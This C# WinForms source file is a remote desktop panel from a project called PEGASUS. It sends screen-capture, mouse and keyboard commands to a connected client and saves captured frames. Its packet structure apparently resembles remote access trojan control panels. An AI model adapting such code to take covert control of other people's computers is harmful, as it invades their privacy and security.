using IcarusLib;
using PEGASUS.Diadyktio;
using PEGASUS.IcarusLib.Metafora_Eikonas;
using PEGASUS.Metafora_Dedomenon;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace PEGASUS.Design
{
    public partial class FormRemoteDesktop : Form
    {
        private readonly List<Keys> _keysPressed;
        public IUnsafeCodec decoder = new UnsafeStreamCodec(60);

        public int FPS = 0;
        private bool isKeyboard;
        private bool isMouse;
        public Size rdSize;
        public Stopwatch sw = Stopwatch.StartNew();
        public object syncPicbox = new object();

        public FormRemoteDesktop()
        {
            _keysPressed = new List<Keys>();
            InitializeComponent();
        }

        public PEGALISIUS F { get; set; }
        internal Clients ParentClient { get; set; }
        internal Clients Client { get; set; }
        public string FullPath { get; set; }
        public Image GetImage { get; set; }


        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected) Close();
            }
            catch
            {
                Close();
            }
        }

        private void FormRemoteDesktop_Load(object sender, EventArgs e)
        {
            try
            {
                button1.Tag = "stop";
            }
            catch
            {
            }
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            if (button1.Tag == "play")
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                msgpack.ForcePathObject("Option").AsString = "capture";
                msgpack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value.ToString());
                msgpack.ForcePathObject("Screen").AsInteger = Convert.ToInt32(numericUpDown2.Value.ToString());
                decoder = new UnsafeStreamCodec(Convert.ToInt32(numericUpDown1.Value));
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                numericUpDown1.Enabled = false;
                numericUpDown2.Enabled = false;
                btnSave.Enabled = true;
                btnMouse.Enabled = true;
                button1.Tag = "stop";
                // button1.BackgroundImage = Properties.Resources.stop__1_;
            }
            else
            {
                button1.Tag = "play";
                try
                {
                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                    msgpack.ForcePathObject("Option").AsString = "stop";
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
                catch
                {
                }

                numericUpDown1.Enabled = true;
                numericUpDown2.Enabled = true;
                btnSave.Enabled = false;
                btnMouse.Enabled = false;
                // button1.BackgroundImage = Properties.Resources.play_button;
            }
        }

        private void BtnSave_Click(object sender, EventArgs e)
        {
            if (button1.Tag == "stop")
            {
                if (timerSave.Enabled)
                {
                    timerSave.Stop();
                    // btnSave.BackgroundImage = Properties.Resources.save_image;
                }
                else
                {
                    timerSave.Start();
                    // btnSave.BackgroundImage = Properties.Resources.save_image2;
                    try
                    {
                        if (!Directory.Exists(FullPath))
                            Directory.CreateDirectory(FullPath);
                        Process.Start(FullPath);
                    }
                    catch
                    {
                    }
                }
            }
        }

        private void TimerSave_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Directory.Exists(FullPath))
                    Directory.CreateDirectory(FullPath);
                var myEncoder = Encoder.Quality;
                var myEncoderParameters = new EncoderParameters(1);
                var myEncoderParameter = new EncoderParameter(myEncoder, 50L);
                myEncoderParameters.Param[0] = myEncoderParameter;
                var jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                pictureBox1.Image.Save(FullPath + $"\\IMG_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.jpeg",
                    jpgEncoder, myEncoderParameters);
                myEncoderParameters?.Dispose();
                myEncoderParameter?.Dispose();
            }
            catch
            {
            }
        }

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            var codecs = ImageCodecInfo.GetImageDecoders();
            foreach (var codec in codecs)
                if (codec.FormatID == format.Guid)
                    return codec;
            return null;
        }

        private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            try
            {
                if (button1.Tag == "stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
                {
                    var p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                    var button = 0;
                    if (e.Button == MouseButtons.Left)
                        button = 2;
                    if (e.Button == MouseButtons.Right)
                        button = 8;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                    msgpack.ForcePathObject("Option").AsString = "mouseClick";
                    msgpack.ForcePathObject("X").AsInteger = p.X;
                    msgpack.ForcePathObject("Y").AsInteger = p.Y;
                    msgpack.ForcePathObject("Button").AsInteger = button;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }

        private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            try
            {
                if (button1.Tag == "stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
                {
                    var p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                    var button = 0;
                    if (e.Button == MouseButtons.Left)
                        button = 4;
                    if (e.Button == MouseButtons.Right)
                        button = 16;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                    msgpack.ForcePathObject("Option").AsString = "mouseClick";
                    msgpack.ForcePathObject("X").AsInteger = p.X;
                    msgpack.ForcePathObject("Y").AsInteger = p.Y;
                    msgpack.ForcePathObject("Button").AsInteger = button;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            try
            {
                if (button1.Tag == "stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
                {
                    var p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                    msgpack.ForcePathObject("Option").AsString = "mouseMove";
                    msgpack.ForcePathObject("X").AsInteger = p.X;
                    msgpack.ForcePathObject("Y").AsInteger = p.Y;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            if (isMouse)
                isMouse = false;
            // btnMouse.BackgroundImage = Properties.Resources.mouse;
            else
                isMouse = true;
            //  btnMouse.BackgroundImage = Properties.Resources.mouse_enable;
            pictureBox1.Focus();
        }

        private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                GetImage?.Dispose();
                ThreadPool.QueueUserWorkItem(o => { Client?.Disconnected(); });
            }
            catch
            {
            }
        }

        private void btnKeyboard_Click(object sender, EventArgs e)
        {
            if (isKeyboard)
                isKeyboard = false;
            // btnKeyboard.BackgroundImage = Properties.Resources.keyboard;
            else
                isKeyboard = true;
            // btnKeyboard.BackgroundImage = Properties.Resources.keyboard_on;
            pictureBox1.Focus();
        }

        private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
        {
            if (button1.Tag == "stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isKeyboard)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;

                if (_keysPressed.Contains(e.KeyCode))
                    return;

                _keysPressed.Add(e.KeyCode);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                msgpack.ForcePathObject("Option").AsString = "keyboardClick";
                msgpack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
                msgpack.ForcePathObject("keyIsDown").SetAsBoolean(true);
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
        }

        private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
        {
            if (button1.Tag == "stop" && pictureBox1.Image != null && ContainsFocus && isKeyboard)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;

                _keysPressed.Remove(e.KeyCode);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                msgpack.ForcePathObject("Option").AsString = "keyboardClick";
                msgpack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
                msgpack.ForcePathObject("keyIsDown").SetAsBoolean(false);
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
        }

        private bool IsLockKey(Keys key)
        {
            return (key & Keys.CapsLock) == Keys.CapsLock
                   || (key & Keys.NumLock) == Keys.NumLock
                   || (key & Keys.Scroll) == Keys.Scroll;
        }


        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private static extern void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void guna2Separator1_Click(object sender, EventArgs e)
        {

        }
    }
}